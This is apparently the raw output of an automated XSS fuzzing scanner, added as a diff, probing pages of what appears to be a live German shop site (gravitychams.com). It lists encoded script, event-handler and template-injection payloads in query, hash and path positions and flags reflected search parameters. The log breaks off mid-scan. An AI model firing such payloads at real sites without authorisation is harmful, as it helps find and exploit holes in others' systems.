@@ -1,0 +1,799 @@
+🎯 STARTING ADVANCED DEEP SPIDER SCAN ON SCOPE: https://mail.gravitychams.com
+==================================================================
+[🔍 Phase 1]: Crawling domain to map all unique endpoints...
+   [*] Indexing entry point: https://mail.gravitychams.com
+[-] Global crawler phase initialization failed. Defaulting to index fuzzing.
+[🚀 Phase 2]: Fuzzing attack permutations across crawled map...
+
+[*] Fuzzing mapped directory: https://mail.gravitychams.com
+   [→] Testing QUERY (search): https://mail.gravitychams.com?search=javascript%3Aalert(1)
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (q): https://mail.gravitychams.com?q=javascript%3Aalert(1)
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (id): https://mail.gravitychams.com?id=javascript%3Aalert(1)
+   [-] Timeout handling vector invocation.
+   [→] Testing HASH (#): https://mail.gravitychams.com#javascript%3Aalert(1)
+   [-] Timeout handling vector invocation.
+   [→] Testing PATH-ROUTER: https://mail.gravitychams.com/javascript%3Aalert(1)
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (search): https://mail.gravitychams.com?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (q): https://mail.gravitychams.com?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (id): https://mail.gravitychams.com?id=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing HASH (#): https://mail.gravitychams.com#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing PATH-ROUTER: https://mail.gravitychams.com/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (search): https://mail.gravitychams.com?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (q): https://mail.gravitychams.com?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (id): https://mail.gravitychams.com?id=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing HASH (#): https://mail.gravitychams.com#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing PATH-ROUTER: https://mail.gravitychams.com/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (search): https://mail.gravitychams.com?search=%3Csvg%20onload%3Dalert(1)%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (q): https://mail.gravitychams.com?q=%3Csvg%20onload%3Dalert(1)%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (id): https://mail.gravitychams.com?id=%3Csvg%20onload%3Dalert(1)%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing HASH (#): https://mail.gravitychams.com#%3Csvg%20onload%3Dalert(1)%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing PATH-ROUTER: https://mail.gravitychams.com/%3Csvg%20onload%3Dalert(1)%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (search): https://mail.gravitychams.com?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (q): https://mail.gravitychams.com?q=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (id): https://mail.gravitychams.com?id=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing HASH (#): https://mail.gravitychams.com#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing PATH-ROUTER: https://mail.gravitychams.com/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (search): https://mail.gravitychams.com?search=%24%7Balert(1)%7D
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (q): https://mail.gravitychams.com?q=%24%7Balert(1)%7D
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (id): https://mail.gravitychams.com?id=%24%7Balert(1)%7D
+   [-] Timeout handling vector invocation.
+   [→] Testing HASH (#): https://mail.gravitychams.com#%24%7Balert(1)%7D
+   [-] Timeout handling vector invocation.
+   [→] Testing PATH-ROUTER: https://mail.gravitychams.com/%24%7Balert(1)%7D
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (search): https://mail.gravitychams.com?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (q): https://mail.gravitychams.com?q=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [-] Timeout handling vector invocation.
+   [→] Testing QUERY (id): https://mail.gravitychams.com?id=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [-] Timeout handling vector invocation.
+   [→] Testing HASH (#): https://mail.gravitychams.com#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [-] Timeout handling vector invocation.
+   [→] Testing PATH-ROUTER: https://mail.gravitychams.com/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [-] Timeout handling vector invocation.
+
+==================================================================
+🎯 STARTING ADVANCED DEEP SPIDER SCAN ON SCOPE: https://www.gravitychams.com
+==================================================================
+[🔍 Phase 1]: Crawling domain to map all unique endpoints...
+   [*] Indexing entry point: https://www.gravitychams.com
+[+] Deep Spider Phase Complete. Found 33 unique system endpoints.
+[🚀 Phase 2]: Fuzzing attack permutations across crawled map...
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/kontaktieren-sie-uns
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kontaktieren-sie-uns?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/kontaktieren-sie-uns?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/kontaktieren-sie-uns?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/kontaktieren-sie-uns#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kontaktieren-sie-uns/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kontaktieren-sie-uns?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kontaktieren-sie-uns?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kontaktieren-sie-uns#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kontaktieren-sie-uns/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kontaktieren-sie-uns?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kontaktieren-sie-uns?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kontaktieren-sie-uns#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kontaktieren-sie-uns/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kontaktieren-sie-uns?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kontaktieren-sie-uns?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kontaktieren-sie-uns#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kontaktieren-sie-uns/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kontaktieren-sie-uns?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/kontaktieren-sie-uns?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/kontaktieren-sie-uns#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kontaktieren-sie-uns/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kontaktieren-sie-uns?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/kontaktieren-sie-uns?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/kontaktieren-sie-uns?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/kontaktieren-sie-uns#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kontaktieren-sie-uns/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/kontaktieren-sie-uns?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/kontaktieren-sie-uns?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/kontaktieren-sie-uns#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/kontaktieren-sie-uns/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/blogs
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/blogs?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/blogs?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/blogs?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/blogs#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/blogs/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/blogs?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/blogs?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/blogs#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/blogs/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/blogs?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/blogs?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/blogs#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/blogs/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/blogs?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/blogs?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/blogs#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/blogs/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/blogs?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/blogs?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/blogs#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/blogs/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/blogs?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/blogs?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/blogs?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/blogs#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/blogs/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/blogs?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/blogs?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/blogs#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/blogs/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/wunschliste
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/wunschliste?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/wunschliste?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/wunschliste?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/wunschliste#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/wunschliste/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/wunschliste?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/wunschliste?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/wunschliste#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/wunschliste/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/wunschliste?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/wunschliste?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/wunschliste#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/wunschliste/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/wunschliste?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/wunschliste?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/wunschliste#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/wunschliste/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/wunschliste?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/wunschliste?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/wunschliste#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/wunschliste/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/wunschliste?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/wunschliste?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/wunschliste?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/wunschliste#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/wunschliste/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/wunschliste?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/wunschliste?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/wunschliste#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/wunschliste/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/warenkorb
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/warenkorb?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/warenkorb?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/warenkorb?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/warenkorb#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/warenkorb/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/warenkorb?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/warenkorb?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/warenkorb#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/warenkorb/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/warenkorb?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/warenkorb?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/warenkorb#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/warenkorb/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/warenkorb?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/warenkorb?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/warenkorb#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/warenkorb/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/warenkorb?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/warenkorb?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/warenkorb#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/warenkorb/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/warenkorb?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/warenkorb?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/warenkorb?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/warenkorb#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/warenkorb/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/warenkorb?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/warenkorb?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/warenkorb#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/warenkorb/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/uber-uns
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/uber-uns?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/uber-uns?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/uber-uns?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/uber-uns#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/uber-uns/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/uber-uns?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/uber-uns?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/uber-uns#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/uber-uns/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/uber-uns?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/uber-uns?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/uber-uns#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/uber-uns/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
